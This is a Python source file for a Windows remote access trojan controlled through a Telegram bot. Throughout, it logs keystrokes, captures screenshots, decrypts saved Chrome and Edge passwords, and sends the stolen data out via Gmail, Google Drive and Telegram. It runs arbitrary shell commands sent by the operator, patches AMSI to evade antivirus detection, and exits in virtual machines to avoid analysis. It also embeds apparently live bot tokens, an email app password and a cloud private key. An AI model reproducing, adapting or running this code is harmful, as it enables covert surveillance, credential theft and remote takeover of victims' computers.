import os
import sys
import time
import socket
import struct
import threading
import subprocess
import ctypes
import smtplib
import mimetypes
import requests
import json
import base64
import sqlite3
import win32crypt
from datetime import datetime
from email.message import EmailMessage
from shutil import copy2
from Crypto.Cipher import AES
from google.oauth2 import service_account
import google.auth.transport.requests

# External libraries
from pynput import keyboard
from PIL import ImageGrab
import win32gui

# ===================== CONFIGURATION =====================
BOT_TOKEN = "8224265517:AAG5YZps6xrVNSIDq9ZOofTJ5uEB78_yGs0"
ADMIN_ID = "8097246713"
EXPIRY_DATE = datetime(2026, 3, 1)

# SMTP Exfiltration Configuration
S_EMAIL = "moetheman111@gmail.com"
S_PASS = "lven uzgu orra unzq" # Gmail App Password
RECIPIENTS = ["moetheman111@gmail.com"]

# Google Drive Service Account Configuration
GDRIVE_CONF = {
  "type": "service_account",
  "project_id": "fast-audio-412222",
  "private_key_id": "99394528faffc1dbb9448d9ef179ef2c8e22d3e2",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCtzuLEWZN6+Rvo\nZmo0EXnjSUcHeTlkyf8QZnPeo9HwKmOA7ZREnYlD6G2xfltsn2Nxn7pE8fa6ehj4\nh2Cw3AP0/esdAxk17/B+PiWAmJM1LZBjq9k//0LR2TEf9h6Qet2cqqwZUDjH9tOH\niSz2v+/oyI6zhTRQBscVjUYv/xiJxqSuMH8ZpGAfDnf24vGeByj03RgyeSvRS5Hb\nRcAdf0qpiHBD270H75+jkYr70vz6JUSH4AfGOvI+l/JyLgWKvJlkmC6rdt7L+zVW\nVFmsluxyiHshCSxg4CfSeMDtzpxOD39MfhFmrvaf9M+xhiMj3U56ZtDPc01X1RGd\noljY1cQBAgMBAAECggEAB5bAbP1SRKzKzKdoHLTkowloigl/eYieU+t9RKvXd0qK\nhK8a6bINM8NawsS3HjOJZoUoX2lHMhYxr+xNSvuYSqKpmN8xQxsiX4i8H3TJ/Kjs\nJIX02uf81WfLzs7yv7E1qukC0aogiI6c5s6VAYMY6QuUu37l7VaWa7j65w6W1jEd\nLbLUt7YKRqksdIkFzHOXmvAchc1pXkJLla6Dm4IjNZFcjKGgK6Rn+tbbqrGTdbVQ\ncBXrPSX++86A6K+4Z7Z3bJgpYkVIfnpkPxFw1ggPMGz+r6KYNaKZkPBEHvokzJPj\n9NvQIvQK02qCBQ+JGNNPK/s5txZdbkBTZ5ql+cE1yQKBgQDo/F8gIDxtjahsaivv\ncIpTYRfP/SM7daG7asMdXIxHPg9+8+QtNR0oCC/Kmx6fJt9yurRFfvfLJhdm57VH\nlSLAI9bZ1iolnza/T+145K/reuB66XUlP0LfIIphZ0fTC8lmxlcx2pLEtgBFX99a\nP4EhTVVgXndAwBIAyw0j3+/03QKBgQC++g8QSYrW596hshFhrq7La6B4qRuBAWFL\n87Mk1OwmYbbuLolnuEoRr513xgAVbH/S1tiHXE9aSVmy19iYE9nkbjHsWIcejvbD\no2TIwyuO0C+1Audgh5M+/ByH8Pbnbtq8iH+fHBXzyQC2jXP0kAyN3DPGkRhF+So0\nCGPzOacXdQKBgBAi4oe8E9NWm1Ke69oShlIOCHMsShNlK0VquIbBESoh/zrAs435\n/sH2BzFWGwHU1GcCzVd+2rSkN7y10ZVam+SI1umRbqvaYhVP+NeFpzV89i0tHCLv\nRbdkbpEecRgJ2fIXTJS0WbPsEwq7ACIlAdGHpKEfCc1fQB/z8D4K1Xi1AoGAVnuK\nwsdq9jL+YJ7wvBmM0lWkz79U0zC6zNhJMc6yOhdZ7bZpRuzvrd6nIowpkYoWwHXG\njFXDIZHB6vlP/l5O9+Dm/q6AUdhP6vxdMYUgfoXMdN4hxVbf2U/146G9TcSnjWUK\n1hSz5DgL+J9J+WAaL0uerrcaFOXmtLVv/b8H6dkCgYEA4Cwc2++d4/aVOpGRmW4E\nHe4s0ULmZSs2DQ46j8VV/FNaxycoSpxuYOfvJr6aSP2kAQ5s0w8yv6q60I41aoIz\nQB87x+7YPTw7WJaAqYhDwIj/VyeQAf/0CO7XCsEwB63R0vghfyKFRQocnz/6uwXK\nFYQhPD+e9nw7gvG+k/mHsmQ=\n-----END PRIVATE KEY-----\n",
  "client_email": "ratking@fast-audio-412222.iam.gserviceaccount.com",
  "client_id": "105124967445366924923",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/ratking%40fast-audio-412222.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}

TRIGGER_WORDS = ["bank", "login", "password", "paypal", "auth"]
KEYSTROKE_LIMIT = 75
MY_HOSTNAME = socket.gethostname()
TEMP_DIR = os.path.join(os.getenv('TEMP'), "System_Audit_Logs")
os.makedirs(TEMP_DIR, exist_ok=True)

keystrokes = []

# ===================== SURVEILLANCE & RECOVERY =====================

def send_email_report(log_path, screenshots):
    msg = EmailMessage()
    msg['From'] = S_EMAIL
    msg['To'] = ", ".join(RECIPIENTS)
    msg['Subject'] = f"Exfiltration Audit: {MY_HOSTNAME}"
    msg.set_content(f"Automated surveillance report generated at {datetime.now()}.")

    for f_path in [log_path] + screenshots:
        if os.path.exists(f_path):
            ctype, _ = mimetypes.guess_type(f_path)
            if ctype is None: ctype = "application/octet-stream"
            main_t, sub_t = ctype.split("/", 1)
            with open(f_path, "rb") as f:
                msg.add_attachment(f.read(), maintype=main_t, subtype=sub_t, filename=os.path.basename(f_path))
    try:
        with smtplib.SMTP("smtp.gmail.com", 587, timeout=20) as s:
            s.starttls()
            s.login(S_EMAIL, S_PASS)
            s.send_message(msg)
    except: pass

def run_burst(data):
    ts = datetime.now().strftime("%H%M%S")
    log_file = os.path.join(TEMP_DIR, f"log_{ts}.txt")
    with open(log_file, "w", encoding="utf-8") as f:
        f.write(f"Keys: {data}\nWindow: {win32gui.GetWindowText(win32gui.GetForegroundWindow())}")
    
    ss_paths = []
    for i in range(5):
        try:
            p = os.path.join(TEMP_DIR, f"ss_{ts}_{i}.png")
            ImageGrab.grab(all_screens=True).save(p)
            ss_paths.append(p)
            time.sleep(2)
        except: pass
    send_email_report(log_file, ss_paths)

def get_browser_creds():
    results = []
    browsers = {
        "Chrome": os.path.join(os.getenv('LOCALAPPDATA', ''), r"Google\Chrome\User Data"),
        "Edge": os.path.join(os.getenv('LOCALAPPDATA', ''), r"Microsoft\Edge\User Data")
    }
    for b_name, b_path in browsers.items():
        state_path = os.path.join(b_path, "Local State")
        if not os.path.exists(state_path): continue
        try:
            with open(state_path, "r", encoding="utf-8") as f:
                key = win32crypt.CryptUnprotectData(base64.b64decode(json.loads(f.read())["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
            # Profiles to search 
            try:
                profiles = [d for d in os.listdir(b_path) if os.path.isdir(os.path.join(b_path, d)) and (d.startswith("Default") or d.startswith("Profile") or d in ("Guest Profile", "System Profile"))]
            except Exception:
                profiles = ["Default"]
            if not profiles:
                profiles = ["Default"]

            for profile in profiles:
                db_path = os.path.join(b_path, profile, "Login Data")
                if not os.path.exists(db_path): continue
                copy2(db_path, "temp_db")
                conn = sqlite3.connect("temp_db")
                cursor = conn.cursor()
                try:
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                except Exception:
                    conn.close(); os.remove("temp_db"); continue
                for url, user, pwd in cursor.fetchall():
                    if user and pwd:
                        try:
                            cipher = AES.new(key, AES.MODE_GCM, pwd[3:15])
                            dec_pwd = cipher.decrypt(pwd[15:])[:-16].decode()
                            results.append(f"[{b_name}/{profile}] {url} | User: {user} | Pass: {dec_pwd}")
                        except Exception:
                            continue
                conn.close()
                try: os.remove("temp_db")
                except: pass
        except Exception:
            continue
    return "\n".join(results) if results else "[-] No credentials recovered."

# ===================== GOOGLE DRIVE MODULE (Large Files) =====================

def get_gdrive_token():
    scopes = ['https://www.googleapis.com/auth/drive.file']
    creds = service_account.Credentials.from_service_account_info(GDRIVE_CONF, scopes=scopes)
    req = google.auth.transport.requests.Request()
    creds.refresh(req)
    return creds.token

def upload_large_file(file_path):
    try:
        token = get_gdrive_token()
        file_size = os.path.getsize(file_path)
        headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
        
        # 1. Initiate Session with Parent Folder ID
        metadata = {
            "name": os.path.basename(file_path),
            "parents": []
        }
        resp = requests.post(
            "https://www.googleapis.com/upload/drive/v3/files?uploadType=resumable",
            headers=headers, data=json.dumps(metadata)
        )
        upload_url = resp.headers['Location']

        # 2. PUT Stream
        headers = {"Content-Range": f"bytes 0-{file_size-1}/{file_size}"}
        with open(file_path, "rb") as f:
            requests.put(upload_url, headers=headers, data=f)
        return True
    except Exception as e:
        tg_send(f"[-] GDrive Error: {str(e)}")
        return False

# ===================== CLOUD C2 MODULE =====================

def tg_send(text):
    print(f"[DEBUG] Sending message to Telegram: {text[:60]}...")
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    for i in range(0, len(text), 4000):
        payload = {"chat_id": ADMIN_ID, "text": f"\n{text[i:i+4000]}"}
        try: 
            requests.post(url, json=payload, timeout=10)
            time.sleep(0.6) 
        except Exception as e:
            print(f"[DEBUG] tg_send exception: {e}")
            pass

def tg_send_file(file_path):
    if os.path.getsize(file_path) > 48000000:
        tg_send(f"[*] File > 50MB. Using Google Drive exfiltration...")
        if upload_large_file(file_path):
            tg_send(f"[+] Success: {os.path.basename(file_path)} uploaded to GDrive.")
        return

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, "rb") as doc:
            requests.post(url, data={'chat_id': ADMIN_ID, 'caption': f'From {MY_HOSTNAME}'}, files={'document': doc}, timeout=30)
    except Exception as e: tg_send(f"[-] Upload failed: {e}")

def tg_download_file(file_id, save_dir=TEMP_DIR, custom_name=None):
    """Download a file from Telegram by file_id and save to save_dir. Optionally specify custom_name."""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getFile"
        resp = requests.get(url, params={"file_id": file_id}, timeout=15)
        resp.raise_for_status()
        file_path = resp.json()["result"]["file_path"]
        file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
        local_name = custom_name if custom_name else os.path.basename(file_path)
        local_path = os.path.join(save_dir, local_name)
        r = requests.get(file_url, timeout=30)
        r.raise_for_status()
        with open(local_path, "wb") as f:
            f.write(r.content)
        tg_send(f"[+] File received and saved as: {local_path}")
        return local_path
    except Exception as e:
        tg_send(f"[-] Failed to download file: {e}")
        return None

def process_command(cmd):
    print(f"[DEBUG] process_command called with: {cmd}")
    if not cmd: return
    cmd_raw = cmd.strip()
    if not (cmd_raw.lower().startswith(MY_HOSTNAME.lower()) or cmd_raw.startswith("!all")):
        print(f"[DEBUG] Command prefix not matched: {cmd_raw}")
        return
    
    cmd_body = cmd_raw.split(' ', 1)[1] if not cmd_raw.startswith("!all") else cmd_raw[5:]
    cmd_clean = cmd_body.lower().strip()

    if cmd_clean == "/help":
        tg_send("Prefix: hostname or!all\ncd <path>\nscreen - Snap\nget <path> - File download\ndel <path> - Delete file\ndump - Force email\ncreds - Browser Pass\nexit - Kill agent")
        return

    if cmd_clean == "creds":
        tg_send("[*] Starting credential recovery...")
        tg_send(get_browser_creds())
        return

    if cmd_clean == "dump":
        tg_send("[*] Generating and sending surveillance report...")
        try:
            run_burst("Manual dump triggered by admin.")
            tg_send("[+] Dump complete and sent via email.")
        except Exception as e:
            tg_send(f"[-] Dump failed: {e}") 
        return

    if cmd_clean.startswith("cd "):
        try:
            os.chdir(cmd_body[3:].strip())
            tg_send(f"[+] Directory: {os.getcwd()}")
        except Exception as e: tg_send(f"[-] Error: {e}")
        return

    if cmd_clean.startswith("get "):
        path = cmd_body[4:].strip()
        tg_send_file(path); return

    if cmd_clean.startswith("del "):
        path = cmd_body[4:].trip()
        try:
            os.remove(path)
            tg_send(f"[+] Deleted: {path}")
        except Exception as e:
            tg_send(f"[-] Delete failed: {e}")
        return

    if cmd_clean == "screen":
        path = os.path.join(TEMP_DIR, "tg_snap.png")
        try: ImageGrab.grab(all_screens=True).save(path); tg_send_file(path)
        except: pass
        return

    if cmd_clean == "exit":
        tg_send("[!] Agent is shutting down as requested.")
        sys.exit()

    try:
        proc = subprocess.Popen(cmd_body, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = proc.communicate()
        res = (out + err).decode('cp437')
        tg_send(res if res else "[+] Success")
    except Exception as e: tg_send(f"[-] Failure: {e}")

def on_press(key):
    global keystrokes
    try:
        k = key.char
        if k: keystrokes.append(k)
    except:
        if key == keyboard.Key.space: keystrokes.append(" ")
        elif key == keyboard.Key.enter: keystrokes.append("\n")
    
    buf = "".join(keystrokes).lower()
    if len(keystrokes) >= KEYSTROKE_LIMIT or any(w in buf for w in TRIGGER_WORDS):
        data = "".join(keystrokes); keystrokes.clear()
        threading.Thread(target=run_burst, args=(data,), daemon=True).start()

def is_vm():
    checks = [
        r"SYSTEM\CurrentControlSet\Services\VBoxGuest",
        r"SOFTWARE\Oracle\VirtualBox Guest Additions",
        r"HARDWARE\ACPI\DSDT\VBOX__"
    ]
    import winreg
    for c in checks:
        try:
            winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, c)
            return True
        except: continue
    return False

def main():
    if datetime.now() > EXPIRY_DATE: sys.exit()
    if is_vm(): time.sleep(600); sys.exit()
    
    try:
        amsi = ctypes.windll.LoadLibrary("amsi.dll")
        addr = ctypes.windll.kernel32.GetProcAddress(amsi._handle, b"AmsiScanBuffer")
        patch = bytearray([0x29, 0xFF, 0xC3]) 
        old = ctypes.c_ulong()
        ctypes.windll.kernel32.VirtualProtect(addr, len(patch), 0x40, ctypes.byref(old))
        ctypes.memmove(addr, bytes(patch), len(patch))
        ctypes.windll.kernel32.VirtualProtect(addr, len(patch), old, ctypes.byref(old))
    except: pass

    keyboard.Listener(on_press=on_press).start()
    last_id = 0
    try:
        r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", timeout=10).json()
        if r.get("ok") and r["result"]: last_id = r["result"][-1]["update_id"]
    except: pass

    is_online = False
    while True:
        try:
            if not is_online:
                pub_ip = requests.get('https://api.ipify.org', timeout=10).text
                print(f"[DEBUG] Bot online, IP: {pub_ip}")
                tg_send(f"🚀 [ONLINE] {MY_HOSTNAME}\nIP: {pub_ip}"); is_online = True

            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            resp = requests.get(url, params={"offset": last_id+1, "timeout": 30}, timeout=35).json()
            print(f"[DEBUG] Telegram getUpdates response: {resp}")
            if resp.get("ok"):
                for update in resp["result"]:
                    print(f"[DEBUG] Processing update: {update}")
                    last_id = update["update_id"]
                    msg = update.get("message", {})
                    print(f"[DEBUG] Message received: {msg}")
                    if str(msg.get("chat", {}).get("id")) == ADMIN_ID:
                        # Handle incoming document (file upload)
                        if "document" in msg:
                            file_id = msg["document"]["file_id"]
                            file_name = msg["document"].get("file_name", "uploaded_file")
                            # Check for caption as custom path
                            custom_path = None
                            if "caption" in msg["document"]:
                                custom_path = msg["document"]["caption"].strip()
                            elif "caption" in msg:
                                custom_path = msg["caption"].strip()
                            if custom_path:
                                # If custom_path is a directory, use as dir, else as full path
                                if os.path.isdir(custom_path):
                                    save_path = tg_download_file(file_id, save_dir=custom_path, custom_name=file_name)
                                else:
                                    save_dir, custom_name = os.path.split(custom_path)
                                    if not save_dir:
                                        save_dir = TEMP_DIR
                                    save_path = tg_download_file(file_id, save_dir=save_dir, custom_name=custom_name)
                            else:
                                save_path = tg_download_file(file_id, custom_name=file_name)
                            if save_path:
                                tg_send(f"[+] File '{file_name}' saved to: {save_path}")
                        # Handle incoming photo (file upload)
                        if "photo" in msg:
                            # Get the largest photo (last in the list)
                            photo_list = msg["photo"]
                            photo_obj = photo_list[-1] if photo_list else None
                            if photo_obj:
                                file_id = photo_obj["file_id"]
                                # Use caption as custom path if provided
                                custom_path = msg.get("caption", None)
                                if custom_path:
                                    # If the caption is in the form: <hostname> <full_path> or <hostname> <dir> <filename>
                                    import re
                                    caption_parts = custom_path.strip().split()
                                    if len(caption_parts) >= 2 and caption_parts[0].lower() == MY_HOSTNAME.lower():
                                        # If 3+ parts, treat as: <hostname> <dir> <filename>
                                        if len(caption_parts) >= 3:
                                            custom_dir = caption_parts[1]
                                            custom_name = ' '.join(caption_parts[2:])
                                        else:
                                            # 2 parts: <hostname> <full_path or dir>
                                            path_candidate = caption_parts[1]
                                            if os.path.isdir(path_candidate):
                                                custom_dir = path_candidate
                                                custom_name = "photo.jpg"
                                            else:
                                                custom_dir, custom_name = os.path.split(path_candidate)
                                                if not custom_dir:
                                                    custom_dir = TEMP_DIR
                                        # No sanitization if absolute path provided by user
                                        if not os.path.exists(custom_dir):
                                            try:
                                                os.makedirs(custom_dir, exist_ok=True)
                                            except Exception as e:
                                                tg_send(f"[-] Failed to create directory: {e}")
                                                custom_dir = TEMP_DIR
                                        save_path = tg_download_file(file_id, save_dir=custom_dir, custom_name=custom_name)
                                    else:
                                        # Fallback to previous logic for non-hostname captions
                                        parts = custom_path.split("\n")
                                        if len(parts) > 1:
                                            custom_name = parts[0].strip()
                                            custom_dir = parts[1].strip()
                                        else:
                                            if os.path.isdir(custom_path):
                                                custom_name = "photo.jpg"
                                                custom_dir = custom_path
                                            elif os.path.dirname(custom_path):
                                                custom_dir, custom_name = os.path.split(custom_path)
                                            else:
                                                custom_name = custom_path
                                                custom_dir = TEMP_DIR
                                        # Sanitize custom_dir to avoid invalid characters
                                        invalid_chars = r'[<>:"/\\|?*]'
                                        custom_dir_sanitized = re.sub(invalid_chars, '', custom_dir)
                                        if not os.path.isabs(custom_dir_sanitized):
                                            custom_dir_sanitized = os.path.join(TEMP_DIR, custom_dir_sanitized)
                                        if not os.path.exists(custom_dir_sanitized):
                                            try:
                                                os.makedirs(custom_dir_sanitized, exist_ok=True)
                                            except Exception as e:
                                                tg_send(f"[-] Failed to create directory: {e}")
                                                custom_dir_sanitized = TEMP_DIR
                                        save_path = tg_download_file(file_id, save_dir=custom_dir_sanitized, custom_name=custom_name)
                                else:
                                    save_path = tg_download_file(file_id, custom_name="photo.jpg")
                                if save_path:
                                    tg_send(f"[+] Photo saved to: {save_path}")
                        # Handle text commands as before
                        if "text" in msg:
                            print(f"[DEBUG] Message from ADMIN_ID: {msg.get('text')}")
                            threading.Thread(target=process_command, args=(msg.get("text"),), daemon=True).start()
                    else:
                        print(f"[DEBUG] Message from non-admin: {msg.get('chat', {}).get('id')}")
        except Exception as e:
            print(f"[DEBUG] Exception in main loop: {e}")
            if is_online:
                tg_send(f"[!] Agent {MY_HOSTNAME} is now OFFLINE or encountered an error: {e}")
            is_online = False; time.sleep(20)

if __name__ == "__main__":
    main()